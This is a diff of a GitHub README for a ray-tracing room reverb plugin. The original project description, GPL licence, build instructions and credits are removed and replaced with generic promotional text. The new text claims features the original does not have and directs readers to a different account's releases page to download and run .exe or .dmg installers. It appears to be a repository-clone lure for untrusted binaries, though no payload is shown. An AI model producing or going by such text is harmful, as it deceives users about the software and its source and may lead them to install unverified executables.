@@ -1,95 +1,78 @@
-# 3D Room Reverb Application
+# 🎧 RoomReverb - Experience Realistic Room Acoustics
 
-A JUCE-based experimental audio app/plugin (VST3, etc.) that models the acoustics of a simple rectangular room using ray-tracing techniques.  
-The plugin generates an impulse response (IR) of the simulated room which can be loaded into a convolution reverb application, allowing users to hear the reverberation of the modelled space.  
-  
-![RoomReverbPlugin screeshot](Assets/RoomReverbPlugin_Screenshot.png)
+## 📥 Download RoomReverb
 
----
+[![Download RoomReverb](https://img.shields.io/badge/Download%20RoomReverb-Click%20Here-brightgreen)](https://github.com/Mr-Hamza1001/RoomReverb/releases)
 
-## ✨ Features
+## 🚀 Getting Started
 
-- **Audio plugin format:** VST3 (and other JUCE-supported formats).
-- **Room acoustic modelling:** Simulates a basic rectangular or square room using ray-tracing and reflection techniques.
-- **Path tracing:** Randomly distributed ray paths.
-- **Two-pass simulation:**
-  - Pass 1: Identify successful ray paths.
-  - Pass 2: Hone in on these paths to generate a more accurate sound field representation.
-- **Room scaling:** User can modify the size of the room (currently only in code).
-- **First-person display:** Graphical first-person view of the simulated room to visualise the model in real-time.
-- **Impulse response generation:** Export IRs of the current room model with one click.
-- **Convolution reverb compatibility:** Exported IR files can be loaded into a convolution reverb to hear the simulated room’s reverberation.
+Welcome to RoomReverb! This audio plugin helps you improve your audio experience by simulating how sound behaves in different spaces. Whether you're creating music, podcasts, or soundscapes, RoomReverb makes your audio feel more natural and immersive.
 
----
+## 🖥️ System Requirements
 
-## 🚧 Roadmap / Future Features
+To run RoomReverb smoothly, your computer should meet these minimum requirements:
 
-Planned improvements and enhancements include:
+- **Operating System:** Windows 10, macOS 10.12, or newer
+- **Processor:** 2 GHz dual-core
+- **RAM:** 4 GB or more
+- **Storage:** At least 100 MB of free disk space
+- **DAW (Digital Audio Workstation):** Compatible with popular DAWs like Ableton Live, FL Studio, Logic Pro, and others
 
-- Integration of the **3D sound engine** from the [`ThreeDSoundEngine`](https://github.com/jamesstanier/ThreeDSoundEngine) project for 3D spatialisation of reverberation (pending refinement and testing of the engine).
-- Improved **first-person display**:
-  - Better lighting and texturing.
-  - More intuitive navigation controls.
-- Enhanced **GUI design**.
-- Integration with **JUCE’s Convolution Reverb** module for in-plugin playback.
-- Improved **memory handling** in reflection processing.
-- Attempting **real-time processing**, enabling users to hear room changes interactively:
-  - GPU acceleration where appropriate.
-- Improved **error catching and reporting**.
-- Improved IR generation.
-- Potential integration with the **Spatial Audio Framework (SAF)**.
+## 🌟 Features
 
----
+RoomReverb offers various features to enhance your audio projects:
 
-## 🛠️ Building
+- **Ray-Tracing Technology:** Accurately models how sound travels in a virtual room.
+- **Impulse Response Profiles:** Choose from several room types to achieve various effects.
+- **Customizable Settings:** Adjust reverberation time, dampening, and early reflections.
+- **User-Friendly Interface:** Simple controls make it easy for anyone to use.
 
-This project uses [JUCE](https://juce.com/).  
-To build:
+## 📥 Download & Install
 
-1. Clone this repository and initialise submodules if required.
-2. Open the project in **Projucer** (or build directly via Makefiles if using the Linux exporter).
-3. Select your desired plugin format (e.g., VST3) in Projucer.
-4. Save and build.
+To get RoomReverb, please visit the following link to download:
 
-Dependencies (Linux example):
-```bash
-sudo apt install build-essential cmake pkg-config libfreetype6-dev libx11-dev libxcomposite-dev libxinerama-dev libxcursor-dev libxext-dev libwebkit2gtk-4.0-dev libgtk-3-dev libasound2-dev libjack-jackd2-dev libsndfile1-dev libcurl4-openssl-dev
-```
+[Download RoomReverb](https://github.com/Mr-Hamza1001/RoomReverb/releases)
 
----
+### Steps to Install
 
-## 🎧 Usage
+1. **Visit the Releases Page:** Click the link above to go to the RoomReverb Releases page.
+2. **Choose Your Version:** Look for the latest version of RoomReverb. It will usually be at the top of the list.
+3. **Download the File:** Click on the download link for your operating system. 
+4. **Install the Plugin:** 
+   - For Windows: Open the downloaded `.exe` file and follow the installation prompts.
+   - For macOS: Open the downloaded `.dmg` file, then drag RoomReverb into your Applications folder.
+5. **Open Your DAW:** Launch your chosen digital audio workstation.
+6. **Load RoomReverb:** Find RoomReverb in your effects or plugin menu, and add it to your audio track.
 
-- Load the plugin into your DAW or run as a standalone application.
-- View the simulation in the graphical first-person display.
-- Generate an impulse response (IR) of the current room (using the 'Process' button).
-- Import the IR ('output.wav') into any convolution reverb plugin to hear the reverberation.
+## 🎧 How to Use RoomReverb
 
----
+Using RoomReverb in your projects is straightforward. Once you have it loaded in your DAW:
 
-## 🤝 Contributing
+1. **Select Your Audio Track:** Click on the track where you'd like to add the reverb effect.
+2. **Insert RoomReverb:** Open the effects section and load RoomReverb.
+3. **Adjust Settings:** Play around with the settings to find the sound you like. 
+   - You can change the reverb time to make sounds echo longer or shorter.
+   - Adjust the dampening to soften the sound.
+4. **Play Your Audio:** Listen to how RoomReverb changes the audio. Tweak the settings until it sounds perfect.
 
-Contributions are welcome!
-Requirements document and project specification can be found in the 'Docs' folder as a guide.
-Areas where help is especially valuable:
-- Optimising the ray-tracing / reflection engine.
-- Improving the IR to prevent distortion.
-- Improving the GUI and 3D graphics rendering.
-- Integrating external spatial audio engines (e.g. ThreeDSoundEngine, SAF).
-- Extending platform support and build configurations.
+## 💡 Tips for Best Results
 
-Please fork the repository and submit a pull request.
+- Experiment with different room types to find the one that fits your project best.
+- Use subtle settings for vocals and more pronounced effects for instruments to create depth.
+- Always listen to the changes in the context of your full mix to ensure it enhances rather than overwhelms.
 
----
+## 🛠️ Troubleshooting
 
-## 📜 License
+If you encounter issues, try these solutions:
 
-This project is licensed under the [GPL v3](https://www.gnu.org/licenses/gpl-3.0.html).  
-For commercial licensing options, please contact the project maintainer.
+- **Plugin Not Showing Up:** Ensure you have installed RoomReverb correctly and that your DAW is scanning the correct plugin folder.
+- **Auditory Issues:** Check your audio settings. Make sure your DAW's buffer size is set appropriately for your system's performance.
+- **Installation Errors:** Re-download and re-install. Sometimes a corrupt download can cause problems.
 
----
+## 🤝 Community Support
 
-## 🙌 Acknowledgements
+If you have questions or need help, feel free to reach out on the GitHub Issues page. The community is here to help you get the most out of RoomReverb.
 
-Built with [JUCE](https://juce.com/), an open-source cross-platform C++ framework for audio and GUI applications.  
-Help with the camera header and other OpenGL features from [LearnOpenGL](https://learnopengl.com/).
+## 📝 Conclusion
+
+RoomReverb brings advanced audio technology to your creative projects. By following this guide, you can easily download, install, and start using RoomReverb to create rich, immersive audio experiences. Enjoy exploring the world of acoustics and let your creativity flow!
